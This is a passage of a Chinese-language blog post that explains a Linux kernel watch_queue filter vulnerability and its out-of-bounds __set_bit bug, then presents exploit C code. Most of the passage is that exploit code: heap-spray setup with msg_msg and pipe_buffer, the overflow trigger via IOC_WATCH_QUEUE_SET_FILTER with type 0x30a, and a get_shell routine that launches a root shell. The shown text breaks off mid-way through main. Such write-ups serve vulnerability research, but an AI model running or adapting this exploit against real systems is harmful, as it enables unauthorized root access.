class="number">0</span>];</span><br><span class="line">  __set_bit(q-&gt;type, wfilter-&gt;type_filter);</span><br><span class="line">  q++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码片段，在后面通过for循环使用的却是<code>filter.nr_filters</code>并且这里对于type的验证验证和上面的也不相同。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITS_PER_LONG 64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BITS_PER_LONG 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_64BIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tf[i].type &gt;= <span class="keyword">sizeof</span>(wfilter-&gt;type_filter) * BITS_PER_LONG)</span><br></pre></td></tr></table></figure><p>所以不难想到的是可以通过指定<code>type</code>的值为这个<code>[0x80, 0x400)</code>区间内的特定值即可实现越界写。</p><h3 id="漏洞点二"><a href="#漏洞点二" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><p>而第二个漏洞也位于在最后赋值时的<code>__set_bit</code>函数中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIT_MASK(nr)(UL(1) &lt;&lt; ((nr) % BITS_PER_LONG))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIT_WORD(nr)((nr) / BITS_PER_LONG)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __set_bit(<span class="keyword">int</span> nr, <span class="keyword">volatile</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mask = BIT_MASK(nr);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *p = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)addr) + BIT_WORD(nr);</span><br><span class="line"></span><br><span class="line">*p  |= mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的作用就是将<code>addr</code>偏移为<code>BIT_WORD(nr)</code>处的<code>BIT_MASK(nr)</code>位置为1，因为type是可控的，所以控制得当的话可以越界置一位为1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">watch_notification_type</span> <span class="title">type</span>;</span></span><br><span class="line">__u32subtype_filter[<span class="number">1</span>];<span class="comment">/* Bitmask of subtypes to filter on */</span></span><br><span class="line">__u32info_filter;<span class="comment">/* Filter on watch_notification::info */</span></span><br><span class="line">__u32info_mask;<span class="comment">/* Mask of relevant bits in info_filter */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>type_filter[<span class="number">2</span>];<span class="comment">/* Bitmask of accepted types */</span></span><br><span class="line">&#125;;</span><br><span class="line">u32nr_filters;<span class="comment">/* Number of filters */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面的<code>watch_filter</code>长这样。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>网上的有关这个CVE使用的方法几乎都是利用的漏洞二。当然，仔细想一下也会发现漏洞二在利用的过程中更为易用。接着就是思考溢出问题了，若是我们选择一个type为0x30a的话，我们得到的偏移为<code>(0x30a / 64) * 8 = 0x60</code>，所以我们只需要让上面的<code>object</code>的大小为0x60即可影响到后面的object了。所以我们这里选择的<code>nr_filters</code>为4，除去上面的这一个即为3。那么此时内核给<code>wfilter</code>分配的大小为<code>0x18 + 3 * 0x10 = 0x48</code>所以可以申请到<code>0x60</code>的<code>object</code>。这时再根据<code>BIT_MASK</code>计算可得最终结果为<code>0x400</code>。</p><p>其实说到这里的时候各位应该都想到了解题方法了吧。对的，可以使用 <a class="link"   href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/" >CVE-2021-22555<i class="fas fa-external-link-alt"></i></a> 即可完成后续利用 (这里不再详细解释了)。</p><h3 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/watch_queue.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">void</span> (*func)(struct callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">void</span> *))));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rcu_head callback_head</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">watch_notification_type</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> subtype_filter[<span class="number">1</span>]; <span class="comment">/* Bitmask of subtypes to filter on */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> info_filter;       <span class="comment">/* Filter on watch_notification::info */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> info_mask;         <span class="comment">/* Mask of relevant bits in info_filter */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_filter</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> type_filter[<span class="number">2</span>]; <span class="comment">/* Bitmask of accepted types */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_filters; <span class="comment">/* Number of filters */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_TYPE 0x42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_SIZE 96</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VICTIM_MSG_TYPE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SOCKET_NUM 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OOB_PIPE_NUM 100</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">void</span> *next;     <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> page;</span><br><span class="line">    <span class="keyword">uint32_t</span> offset, len;</span><br><span class="line">    <span class="keyword">uint64_t</span> ops;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">uint32_t</span> padding;</span><br><span class="line">    <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">    <span class="keyword">uint64_t</span> release;</span><br><span class="line">    <span class="keyword">uint64_t</span> try_steal;</span><br><span class="line">    <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">&#125; secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger_overflow</span><span class="params">(<span class="keyword">int</span> oob_pipe[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> *<span class="title">wfilter</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> nfilters;</span><br><span class="line"></span><br><span class="line">    nfilters = <span class="number">4</span>;</span><br><span class="line">    wfilter = (struct watch_notification_filter *)</span><br><span class="line">        <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(struct watch_notification_filter) + nfilters * <span class="keyword">sizeof</span>(struct watch_notification_type_filter));</span><br><span class="line">    wfilter-&gt;nr_filters = nfilters;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (nfilters - <span class="number">1</span>); i++)</span><br><span class="line">        wfilter-&gt;filters[i].type = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    wfilter-&gt;filters[nfilters - <span class="number">1</span>].type = <span class="number">0x30a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(oob_pipe[<span class="number">0</span>], IOC_WATCH_QUEUE_SET_FILTER, wfilter) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(wfilter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> oob_pipe_fd[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="keyword">int</span> oob_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span 